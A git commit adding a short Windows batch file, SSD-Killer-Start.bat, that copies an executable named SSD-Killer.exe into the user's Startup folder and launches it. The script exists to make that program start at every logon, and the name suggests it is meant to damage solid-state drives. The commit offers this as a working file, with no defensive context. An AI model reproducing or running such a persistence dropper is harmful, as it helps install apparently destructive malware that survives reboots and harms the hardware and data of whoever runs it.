bab5ae888759067f12c3a9d7ef7d63239364e31a
Spar <74677348+Sparpvp@users.noreply.github.com>
2021-03-26 00:12:15 +0100

    Create SSD-Killer-Start.bat

---
+++ SSD-Killer-Start.bat
@@ -0,0 +1,3 @@
+@echo off
+copy /b "bin\SSD-Killer.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SSD-Killer.exe"
+start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SSD-Killer.exe"
